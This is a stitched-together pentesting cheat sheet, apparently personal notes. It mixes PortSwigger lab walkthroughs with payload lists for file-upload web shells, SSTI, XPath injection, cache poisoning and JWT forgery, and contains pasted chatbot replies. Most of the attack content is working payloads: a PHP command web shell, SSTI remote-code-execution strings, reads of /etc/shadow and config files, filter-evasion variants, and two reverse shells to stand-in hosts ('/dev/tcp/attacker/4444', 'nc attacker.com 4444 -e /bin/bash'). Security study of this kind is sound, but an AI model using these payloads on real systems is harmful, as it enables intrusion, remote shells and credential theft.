AddType application/x-httpd-php .l33t
```

![image](https://github.com/user-attachments/assets/d5c28714-b171-48e5-a810-74d2536b9e66)
![image](https://github.com/user-attachments/assets/c83a070f-68b8-47cc-a1df-d6a04f3d8512)

Upload Phpinfo file:

```
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename="test.l33t"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
```
![image](https://github.com/user-attachments/assets/5e6db857-49a8-4d07-9163-947106d12ca2)
![image](https://github.com/user-attachments/assets/aa79fc19-eb2b-4d42-8262-e446e80ae7e1)

Upload cmdshell:

```
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename="cmd.l33t"
Content-Type: application/octet-stream

<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
}
```
```
https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=whoami
```

![image](https://github.com/user-attachments/assets/69e08b6d-cd26-47c4-a075-cf2b672ee0b0)
![image](https://github.com/user-attachments/assets/958ac36f-b5cf-4d99-b095-a85c6c3c803b)

Read the file:

```
https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=cat%20/home/carlos/secret
```
MzrfsTWgFr82UcKq9wFC0hObV7YSVmlq

![image](https://github.com/user-attachments/assets/f84d4401-892e-4fe9-b111-35151e73a5b3)

# Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

I uploaded a real JPG file and deleted as many bytes as possible. This is the least you can send so the server still finds it is a JPG image:

![image](https://github.com/user-attachments/assets/9229ab37-4a90-4343-aed9-1dd065666047)

So we can change everything to update a PHP file like this:

```
POST /my-account/avatar HTTP/2
...
-----------------------------223006367629168816071656253944
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/php

<--JPG MAGIC NUMBER-->

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------223006367629168816071656253944
...
```
![image](https://github.com/user-attachments/assets/6f1a71b9-dc4c-488d-93c6-2d24ce0278b3)

And then access /files/avatars/test.php to read the content of the file:

![image](https://github.com/user-attachments/assets/9b414baa-624c-4434-a32b-130969dc2bfb)

# Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

It is not possible to upload PHP files:

![image](https://github.com/user-attachments/assets/1c5bb867-e2f8-46da-ac5a-4698225248de)

I tried to upload the file with the names:

- “test.php.jpg” but it is interepreted as an image.

- “test.php.” but it is not accepted

- “test%2Ephp” but it is not accepted

The payload “test.php%00.jpg” uploads a file “test.php”:

```
POST /my-account/avatar HTTP/2
...
-----------------------------384622689610978532422380962615
Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------384622689610978532422380962615
...
```
![image](https://github.com/user-attachments/assets/04ef5e62-4432-4a73-a19e-65e30ebc82c0)

The file test.php has been created:

![image](https://github.com/user-attachments/assets/74844fe3-56bf-4b97-a45a-811ea081d727)

## 15. XML External Entity (XXE) Injection

### Payload:
```xml
<foo><text>Xml testing</text></foo>
```

### Exploitation:
- Use `Burp Suite Intruder` to automate attacks.
- Use `xml-attacks` payloads.

---
# Mass Assignment

> A mass assignment attack is a security vulnerability that occurs when a web application automatically assigns user-supplied input values to properties or variables of a program object. This can become an issue if a user is able to modify attributes they should not have access to, like a user's permissions or an admin flag.

## Summary

* [Methodology](#methodology)
* [Labs](#labs)
* [References](#references)


## Methodology

Mass assignment vulnerabilities are most common in web applications that use Object-Relational Mapping (ORM) techniques or functions to map user input to object properties, where properties can be updated all at once instead of individually. Many popular web development frameworks such as Ruby on Rails, Django, and Laravel (PHP) offer this functionality.

For instance, consider a web application that uses an ORM and has a user object with the attributes `username`, `email`, `password`, and `isAdmin`. In a normal scenario, a user might be able to update their own username, email, and password through a form, which the server then assigns to the user object.

However, an attacker may attempt to add an `isAdmin` parameter to the incoming data like so:

```json
{
    "username": "attacker",
    "email": "attacker@email.com",
    "password": "unsafe_password",
    "isAdmin": true
}
```

If the web application is not checking which parameters are allowed to be updated in this way, it might set the `isAdmin` attribute based on the user-supplied input, giving the attacker admin privileges


## Labs

* [PentesterAcademy - Mass Assignment I](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1964)
* [PentesterAcademy - Mass Assignment II](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1922)
* [Root Me - API - Mass Assignment](https://www.root-me.org/en/Challenges/Web-Server/API-Mass-Assignment)


## References

- [Hunting for Mass Assignment - Shivam Bathla - August 12, 2021](https://blog.pentesteracademy.com/hunting-for-mass-assignment-56ed73095eda)
- [Mass Assignment Cheat Sheet - OWASP - March 15, 2021](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [What is Mass Assignment? Attacks and Security Tips - Yoan MONTOYA - June 15, 2023](https://www.vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips/)
- -------------
## Web Cache Deception Attack

### Steps:
1. Browse normally: `https://www.example.com/myaccount/home/`
2. Open malicious link: `https://www.example.com/myaccount/home/malicious.css`
3. The cache saves the page.
4. Open in a private tab: `https://www.paypal.com/myaccount/home/malicious.css`

### Cache Poisoning Headers:
- `X-Forwarded-Host`
- `X-Host`
- `X-Forwarded-Scheme`
- `X-Original-URL`
- `X-Rewrite-URL`

### Example Attack:
```http
GET /test?buster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: test"><script>alert(1)</script>
```
---

## Insecure Direct Object References (IDOR)
Insecure Direct Object References (IDOR) is a security vulnerability that occurs when an application allows users to directly access or modify objects (such as files, database records, or URLs) based on user-supplied input, without sufficient access controls. This means that if a user changes a parameter value (like an ID) in a URL or API request, they might be able to access or manipulate data that they aren’t authorized to see or modify.

### Tools:
•	PortSwigger/BApp Store > Authz
•	PortSwigger/BApp Store > AuthMatrix
•	PortSwigger/BApp Store > Autorize

### Example Parameters:
- `http://foo.bar/somepage?invoice=12345`
- `http://foo.bar/changepassword?user=someuser`
- `http://foo.bar/showImage?img=img00011`
- `https://example.com/profile?user_id=123:`c
---

## XPATH Injection

### Example Payloads:
```xpath
' or '1'='1
' or ''=''
x' or 1=1 or 'x'='y
```

### Blind Exploitation:
```xpath
and string-length(account)=SIZE_INT
```

### Tools:
- [xcat](https://github.com/orf/xcat)
- [xxxpwn](https://github.com/feakk/xxxpwn)
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR)

---

## XSLT Injection

### Description:
Processing an unvalidated XSL stylesheet can allow an attacker to change XML structure, include arbitrary files, or execute commands.

### Tools:
- [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#tools)
---
## Template Injection (SSTI)
> Absolutely, here's the **section-wise SSTI fuzzing parameter list** formatted for automation use — modular, categorized, and ready for integration:
---
### 🔍 **Generic Parameters**
```text
name, username, user, message, comment, bio, description, title, subject, content, search, query, input, data, value, text, email, phone, address, location, city, country, lang, template, theme, style, color
```
---
### 📨 **Form & Submission Parameters**
```text
feedback, review, note, reply, post, submit, form, entry, details, remarks
```
---
### 🧠 **Logic & Control Parameters**
```text
greeting, welcome, status, role, type, mode, level, priority, flag, state, action, option, choice
```
---
### 🧱 **Template-Specific Parameters**
```text
tpl, tmpl, template_id, template_name, template_type, engine, render, view, layout, partial, fragment
```
---
### 🍪 **Cookie Parameters**
```text
session, token, auth, user_id, theme, lang
```
---
### 🧾 **Header Parameters**
```text
User-Agent, Referer, X-Forwarded-For, X-Client-Data, X-Requested-With, X-Template-Engine
```
---
### 🧭 **URL/Path Parameters**
```text
page, view, id, slug, route, path, endpoint, file, doc, article
```
---

### 📦 **JSON Keys (for API fuzzing)**
```json
"name", "message", "template", "data"
```

### Tools:
- [Tplmap](https://github.com/epinna/tplmap)

### Basic Injections:
#### ERB Engine:
```erb
<%= 7 * 7 %>
<%= File.open('/etc/passwd').read %>
<%= system('cat /etc/passwd') %>
```

#### Java:
```java
${7*7}
${class.getClassLoader()}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
```

#### Twig:
```twig
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```
Absolutely, Anvesh! Here's a **complete SSTI test case list with payloads**, aligned with your GitHub methodology and PortSwigger’s lab structure. It’s formatted for clarity and ready to drop into your cheat sheets or automation workflows.

---

## 🧪 Server-Side Template Injection (SSTI) — Test Cases with Payloads

---

### **1. Basic Expression Evaluation**
Detects template parsing by evaluating math or string operations.

```text
{{7*7}}         → 49 (Jinja2, Twig)
${7*7}          → 49 (Velocity)
<%= 7*7 %>      → 49 (EJS)
#{7*7}          → 49 (Pug)
```

---

### **2. Error-Based Detection**
Triggers template engine errors to identify backend tech.

```text
{{7/0}}         → Division error (Jinja2)
${7/0}          → Velocity error
<%= 7/0 %>      → EJS error
```

---

### **3. Template Engine Identification**
Use engine-specific syntax to fingerprint the backend.

```text
{{"a"*5}}       → aaaaa (Jinja2)
${"a".repeat(5)} → aaaaa (Velocity)
<%= "a".repeat(5) %> → aaaaa (EJS)
```

---

### **4. Code Execution via SSTI**
Execute system commands if template engine allows.

```text
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}  # Jinja2
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}                    # Java (Freemarker)
<%= require('child_process').execSync('id') %>                                           # Node.js (EJS)
```

---

### **5. File Read via SSTI**
Access sensitive files using template logic.

```text
{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}  # Jinja2
${new java.io.FileReader('/etc/passwd')}                      # Java
<%= fs.readFileSync('/etc/passwd') %>                         # Node.js
```

---

### **6. Blind SSTI via Time Delay**
Use time-based payloads to infer execution.

```text
{{ cycler.__init__.__globals__.os.system('sleep 5') }}        # Jinja2
${T(java.lang.Thread).sleep(5000)}                            # Java
<%= require('child_process').execSync('sleep 5') %>           # Node.js
```

---

### **7. SSTI via POST Body**
Inject payloads into form fields or JSON.

```http
POST /submit HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name={{7*7}}
```

---

### **8. SSTI via Headers**
Inject into `User-Agent`, `Referer`, or custom headers.

```http
GET / HTTP/1.1
Host: vulnerable.com
User-Agent: {{7*7}}
```

---

### **9. SSTI via Cookies**
Target server-side parsing of cookie values.

```http
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session={{7*7}}
```

---

### **10. SSTI via URL Path or Query**
Inject directly into path or query parameters.

```http
GET /hello/{{7*7}} HTTP/1.1
Host: vulnerable.com
```

---

### **11. SSTI via Template Injection in Logic**
Manipulate template logic or control flow.

```text
{{ config.items() }}  # Jinja2
${applicationScope}   # JSP
<%= locals %>         # EJS
```

---

### **12. SSTI via Nested Evaluation**
Use double evaluation to bypass filters.

```text
{{ '{{7*7}}' }} → {{7*7}} → 49
```

---

### **13. SSTI via Unescaped Output**
Inject into unescaped template blocks.

```text
{{ unsafe_variable }}  # If not escaped
```

---

### **14. SSTI via Template Injection in Email/Message**
Inject into dynamic templates used in emails or notifications.

```text
Dear {{user.name}}, your balance is {{user.balance}}.
→ Inject: {{7*7}} → 49
```
# **✅ Server-Side Template Injection (SSTI) – Complete Test Case (with Bypass Cases)**
```
1.1 Basic SSTI Expression Injection
1.2 Sandbox Escape in Template Engines
1.3 Arbitrary Code Execution (RCE)
1.4 File Read via Template Functions
1.5 Server-Side Variable Manipulation
1.6 Template Logic Abuse (Loops, Conditions)
1.7 Bypass of Filtered Template Syntax
1.8 Chaining SSTI → LFI → RCE
1.9 HTML Injection → SSTI (Context Breakout)
1.10 Framework-Specific Template Engine Exploits (Jinja2, Twig, Freemarker)
```

---

# **2. Sample Payloads (Core Attack Payloads)**

*(Normal structure — non-weaponized education payloads)*

```
2.1 Basic Injection Test
{{7*7}}
```

```
2.2 Alternative Syntax Injection
${7*7}
```

```
2.3 Jinja2 Variable Leak
{{ config }}
```

```
2.4 Twig Debug Variable Access
{{ dump() }}
```

```
2.5 JSP / Expression Language (EL)
${'SSTI'}
```

```
2.6 Template Logic Injection
{{ ["S","S","T","I"]|join("") }}
```

```
2.7 Expression-Based Testing
{{ 1+2 }}
```

```
2.8 PHP Smarty Test
{$smarty.version}
```

---

# **3. Sample Payloads (Updated With Real Payloads for Learning)**

*(Real offensive payloads used for exploitation)*

```
3.1 Jinja2 RCE Payload
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```

```
3.2 Remote Command Execution (Jinja2)
{{ cycler.__init__.__globals__.os.popen("id").read() }}
```

```
3.3 JVM / Spring EL RCE
${T(java.lang.Runtime).getRuntime().exec('id')}
```

```
3.4 Tornado SSTI → File Read
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow').read() }}
```

```
3.5 Twig RCE via Sandbox Escape
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ 'id'|system }}
```

```
3.6 Python SSTI → Reverse Shell
{{ cycler.__init__.__globals__.os.system("bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'") }}
```

```
3.7 PHP Smarty RCE
{$smarty.template_object->smarty->security_policy->php_handling = 2}
```

```
3.8 Handlebars Prototype Pollution → RCE
{{#with "constructor"}}{{#with "constructor"}}{{lookup this "global"}}{{/with}}{{/with}}
```

```
3.9 Mustache Escape to JS RCE
{{#payload}}<img src=x onerror=alert(1)>{{/payload}}
```

```
3.10 Velocity Template Engine RCE
#set($x="".getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
```

---

# **4. Bypass Techniques (Filter Bypass, Syntax Obfuscation, WAF Evasion)**

```
4.1 Whitespace Bypass
{{7 * 7}}
```

```
4.2 Mixed Bracket Bypass
{ { 7*7 } }
```

```
4.3 URL Encoded SSTI
%7B%7B7*7%7D%7D
```

```
4.4 Double-Encoded SSTI
%257B%257B7*7%257D%257D
```

```
4.5 Comment-Injection to Bypass Filtering
{{7*7}}{#comment#}
```

```
4.6 Inline Function Bypass
${{7*7}}
```

```
4.7 Breaking Out of HTML Context
">{{7*7}}
```

```
4.8 Indirect Access to Globals
{{ [].__class__.__mro__[1].__subclasses__() }}
```

```
4.9 Dotless Global Access (Jinja2 Filter Abuse)
{{ request|attr("__class__")|attr("__mro__") }}
```

```
4.10 SSTI via Hidden Fields/JSON Keys
"template": "{{7*7}}"
```

---

# **5. Advanced Attack Chains (Real-World Exploitation)**

```
5.1 SSTI → File Read → Credential Theft
{{ cycler.__init__.__globals__.open('/var/www/app/config.yaml').read() }}
```

```
5.2 SSTI → Code Execution → Reverse Shell
{{ self.__init__.__globals__.os.system('nc attacker.com 4444 -e /bin/bash') }}
```

```
5.3 SSTI → Dump Environment Variables
{{ cycler.__init__.__globals__.os.environ }}
```

```
5.4 SSTI → Privilege Escalation
{{ ''.__class__.__mro__[1].__subclasses__()[150]()._module.__builtins__.open('/root/root.txt').read() }}
```

```
5.5 SSTI → Access Template Source Code
{{ self.__init__.__globals__.__file__ }}
```

```
5.6 SSTI → Database Read (via injected Python)
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/mysql/my.cnf').read() }}
```

```
5.7 SSTI → Internal Network Scan
{{ cycler.__init__.__globals__.os.popen("ping -c 1 127.0.0.1").read() }}
```
---
# JSON Web Token (JWT) Exploitation & SQL Injection Techniques

## JWT - JSON Web Token
JSON Web Token follows the format:
```
Base64(Header).Base64(Data).Base64(Signature)
```
### Example
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY
```
JWT is split into three parts:
- **Header**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
- **Payload**: `eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ`
- **Signature**: `UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

Default algorithm: **HS256** (HMAC SHA256 symmetric encryption). For asymmetric purposes, **RS256** is used.

#### Header Example
```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```
#### Payload Example
```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```
### Exploiting JWT Vulnerabilities
#### Modify JWT Signature to None Algorithm

# 🔐 **JWT Vulnerability Names**

### **1. JWT Signature Validation Bypass**
### **2. JWT “none” Algorithm Acceptance**
### **3. JWT Algorithm Confusion (HS256 ↔ RS256)**
### **4. JWT Weak Signing Key Vulnerability**
### **5. JWT `kid` Header Manipulation**
### **6. JWT Path Traversal via `kid` Header**
### **7. JWT External JWK Injection (`jku`)**
### **8. JWT External Certificate Injection (`x5u`)**
### **9. JWT Header Parameter Injection**
### **10. JWT Claim Tampering**
### **11. JWT Expiration Bypass (`exp`)**
### **12. JWT Issued-In-Future (`iat`) Abuse**
### **13. JWT Not-Before (`nbf`) Misuse**
### **14. JWT Invalid Audience (`aud`) Acceptance**
### **15. JWT Invalid Issuer (`iss`) Acceptance**
### **16. JWT Missing Required Claims**
### **17. JWT Replay Attack (No Revocation / Rotation)**
### **18. JWT Overly Long Token (Token Size DoS)**
### **19. JWT Sensitive Data Exposure in Payload**
### **20. JWT Storage Misconfiguration (localStorage, XSS)**
### **21. JWT Transport Misconfiguration (No HTTPS)**
### **22. JWT Refresh Token Rotation Failure**
### **23. JWT Key Exposure in Logs / Error Messages**
### **24. JWT Weak Randomness in `jti` or IDs**
### **25. JWT Invalid Token Parsing/Deserialization Issues**

---

# 🛡️ **JWT Security Test Cases (Safe Examples Only)**

Each test case includes:

* **Purpose**
* **What to verify**
* **Sample header + payload** (harmless, unsigned, non-exploitable)

---

# ## ✅ **1. Missing Signature / Unverified Signature**

### **Purpose:** Ensure the server rejects unsigned tokens.

### **Expected:** 401 Unauthorized

**Example unsigned JWT:**

```text
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

**Decoded:**

```json
Header:  { "alg": "none" }
Payload: { "user": "admin" }
Signature: (empty)
```

---

# ## ✅ **2. “none” Algorithm Test**

### **Purpose:** Ensure `alg: none` is disabled.

### **Expected:** Reject token.

**Example:**

```json
Header:
{ "alg": "none", "typ": "JWT" }

Payload:
{ "user": "test_user", "role": "admin" }
```

---

# ## ✅ **3. Algorithm Mismatch / Confusion Test (HS256 vs RS256)**

### **Purpose:** Verify server does not auto-switch algorithms.

### **Expected:** Reject mismatched algorithm tokens.

**Example header:**

```json
{ "alg": "HS256", "typ": "JWT" }
```

**Example payload:**

```json
{ "user": "alice", "role": "admin" }
```

*(Signature omitted to ensure safety.)*

---

# ## ✅ **4. Weak Signing Key Test**

### **Purpose:** Ensure server rejects tokens signed with weak HMAC keys.

### **Expected:** Reject or warn.

**Example weak scenario:**

```text
Secret key = "12345"
```

**Test payload:**

```json
{ "user": "test", "exp": 9999999999 }
```

---

# ## ✅ **5. Expired Token**

### **Purpose:** Ensure expiration is enforced.

### **Expected:** Reject token.

**Payload example (expired):**

```json
{
  "user": "bob",
  "exp": 1000000000
}
```

---

# ## ✅ **6. Token Issued in the Future**

### **Purpose:** Ensure `iat` in the future is rejected.

### **Expected:** Reject token.

**Example payload:**

```json
{
  "user": "charlie",
  "iat": 9999999999
}
```

---

# ## ✅ **7. Invalid Audience (`aud`)**

### **Purpose:** Ensure the server validates audience.

### **Expected:** Reject token.

```json
{
  "user": "eve",
  "aud": "unknown-service"
}
```

---

# ## ✅ **8. Invalid Issuer (`iss`)**

### **Purpose:** Verify server enforces strict issuer matching.

### **Expected:** Reject token.

```json
{
  "user": "dave",
  "iss": "fake-issuer"
}
```

---

# ## ✅ **9. Tampered Payload**

### **Purpose:** Server must detect tampering after signature is removed/altered.

### **Expected:** Reject token.

**Original payload:**

```json
{ "user": "frank", "role": "user" }
```

**Tampered payload:**

```json
{ "user": "frank", "role": "admin" }
```

---

# ## ✅ **10. Oversized Token**

### **Purpose:** Identify DoS risk via extremely large payloads.

### **Expected:** Reject or limit token size.

**Example oversized claim block (truncated):**

```json
{
  "user": "test",
  "data": "AAAA....(thousands of characters)....AAAA"
}
```

---

# ## ✅ **11. `kid` Header Manipulation (Safe Example)**

### **Purpose:** Ensure `kid` is sanitized and validated.

### **Expected:** Reject token.

**Header:**

```json
{
  "alg": "HS256",
  "kid": "../../etc/passwd"
}
```

**Payload:**

```json
{ "user": "tester" }
```

*(No signature included.)*

---

# ## ✅ **12. `jku` Header Injection (Safe Example)**

### **Purpose:** Server should block untrusted JWK URLs.

### **Expected:** Reject unless allowlisted.

**Header:**

```json
{
  "alg": "RS256",
  "jku": "http://untrusted.example.com/jwks.json"
}
```

**Payload:**

```json
{ "user": "token_user" }
```

---

# ## ✅ **13. `x5u` External Certificate Fetch (Safe Example)**

### **Purpose:** Ensure strict certificate pinning or URL blocking.

### **Expected:** Reject token.

**Example header:**

```json
{
  "alg": "RS256",
  "x5u": "http://untrusted.example.com/cert.pem"
}
```

**Payload:**

```json
{ "user": "api_user" }
```

---

# ## ✅ **14. Missing Required Claims**

### **Purpose:** Validate presence of all mandatory claims.

### **Expected:** Reject.

**Example payload missing `sub`, `iss`, `aud`:**

```json
{ "user": "test_user" }
```

---

# ## ✅ **15. Replay of Previously Valid Token**

### **Purpose:** Check revocation & refresh token rotation.

### **Expected:** Reject reused/rotated tokens.

**Example payload (conceptual):**

```json
{
  "sub": "12345",
  "jti": "old-revoked-id"
}
```

---

# JWT Labs – PortSwigger

This document consolidates key JWT attack techniques and corresponding labs from PortSwigger's Web Security Academy.([portswigger.net][1])

---

## 1. JWT Authentication Bypass via Unverified Signature

This lab demonstrates a scenario where the server fails to verify the signature of JWTs, allowing attackers to modify token payloads without detection.([portswigger.net][2])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and observe the JWT in the session cookie.
3. Modify the `sub` claim in the payload to `administrator`.
4. Send the modified token to access the admin panel at `/admin`.
5. Delete the user `carlos` to complete the lab.([portswigger.net][3], [portswigger.net][4], [portswigger.net][5], [portswigger.net][2])

**Reference:** [Lab: JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)

---

## 2. JWT Authentication Bypass via "None" Algorithm

In this lab, the server accepts JWTs with the `alg` header parameter set to `none`, effectively disabling signature verification.([portswigger.net][4])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and decode the JWT.
3. Change the `alg` value in the header to `none`.
4. Modify the `sub` claim in the payload to `administrator`.
5. Remove the signature part of the token, leaving the trailing dot.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][6], [portswigger.net][5], [portswigger.net][4], [portswigger.net][3])

**Reference:** [Lab: JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)

---

## 3. JWT Authentication Bypass via Algorithm Confusion

This lab illustrates an algorithm confusion vulnerability where the server uses an RSA key pair but accepts tokens signed with a symmetric algorithm like `HS256`.([portswigger.net][3])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Access the server's public key from the `/jwks.json` endpoint.
3. Convert the public key to a suitable format for signing.
4. Modify the JWT header to use `HS256` and the payload's `sub` claim to `administrator`.
5. Sign the token using the public key as the HMAC secret.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][7], [portswigger.net][3], [portswigger.net][6], [portswigger.net][8], [portswigger.net][2])

**Reference:** [Lab: JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)

---

## 4. JWT Authentication Bypass via Weak Signing Key

This lab focuses on exploiting weak secret keys used for signing JWTs, which can be brute-forced using tools like hashcat.([portswigger.net][5])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and extract the JWT.
3. Use hashcat with a wordlist to brute-force the secret key.
4. Modify the JWT payload's `sub` claim to `administrator`.
5. Sign the token using the discovered secret key.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][7], [portswigger.net][5])

**Reference:** [Lab: JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)

---

## 5. JWT Authentication Bypass via `kid` Header Path Traversal

This lab demonstrates how the `kid` header parameter can be exploited using path traversal to manipulate the key file used for signature verification.([portswigger.net][6])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and decode the JWT.
3. Modify the `kid` value in the header to a path traversal string pointing to `/dev/null`.
4. Change the payload's `sub` claim to `administrator`.
5. Sign the token using a null byte as the secret.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][6])

**Reference:** [Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)

---

## 6. JWT Authentication Bypass via `jku` Header Injection

In this lab, the server accepts a `jku` header parameter pointing to a JSON Web Key Set (JWKS) URL without proper validation, allowing attackers to supply their own keys.([portswigger.net][8])

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Generate a new RSA key pair and host the public key in a JWKS format on an external server.
3. Modify the JWT header to include the `jku` parameter pointing to your JWKS URL and set the `kid` to match your key.
4. Change the payload's `sub` claim to `administrator`.
5. Sign the token using your private key.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.([portswigger.net][7], [portswigger.net][3], [portswigger.net][1], [portswigger.net][8])

**Reference:** [Lab: JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)

```python
import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'

# Decode the token
decodedToken = jwt.decode(jwtToken, verify=False)
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

print(noneEncoded.decode())
```
#### Output:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
```
#### Brute-force JWT Secret Key
```sh
git clone https://github.com/ticarpi/jwt_tool
python2.7 jwt_tool.py <JWT_TOKEN> /tmp/wordlist
```
Reference: [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

### JWT authentication bypass via unverified signature

We can change this JWT in the JSON Web Token extension panel:

![image](https://github.com/user-attachments/assets/da5969c7-811a-489b-b029-ae4ca3d9e371)

Getting the JWT:

```
eyJraWQiOiI0MTZkMDg2Yy00MDdhLTRiYzQtODhhMy00MzAyZTUzMTk1ZTgiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3ODg2MzR9.qmaz_uqHRR06JTx5vtenCveTPOtzi3mG0X1WMJhnKV3AmzlI3Pjceo3Lldu2oLHcP9SEblyJxJJ5hIO3VVAKzWsWGjNw4aN1vZCBhxzcY-MgxuspBc3XpS1_oMeenFcfEn0I4Jlob_YMrZVqQbdp8i1w_SpYLkMOkDaLlgPZk3TwZa1U005YBhHjQrItMBYWRtQDnP4rYnHkTsgwmWRu8RMCirq9-SS9gczbr2YEENZuPrxWphbYwCSMtivcysFOKXEzCvO7juIKqAfE_WmB6qx41I8Wny-qlkbeU3-9VXyIM8iC6opD6wlUiI9S328bjXN_ZFWsuRdaDVyvE4gRXw
```
Then I changed the “Location” header to “/admin”:

![image](https://github.com/user-attachments/assets/b0156e2c-8e35-4ad3-89d4-50aeb6d05608)

Getting access to the admin panel:

![image](https://github.com/user-attachments/assets/89668e77-b8d3-48c5-9ec5-e6b206acf166)

2. **JWT authentication bypass via flawed signature verification**

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.
To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

![image](https://github.com/user-attachments/assets/8a135d4b-a427-48d1-822a-48086d7826db)

![image](https://github.com/user-attachments/assets/4b3faa7e-e5f3-48c9-ad29-b07ddb31377b)

Then delete everything after the second “.” character (that is the signature):

```
eyJraWQiOiIzNjlmMmFjZC1hZTUwLTQ4YzctYTM2Ny04NTczYzllNTc0ZmQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3ODk4MzB9.
```
![image](https://github.com/user-attachments/assets/fa64c5e8-2c1e-4925-a16c-a45b7b8923bf)

Access the admin panel and delete the user:

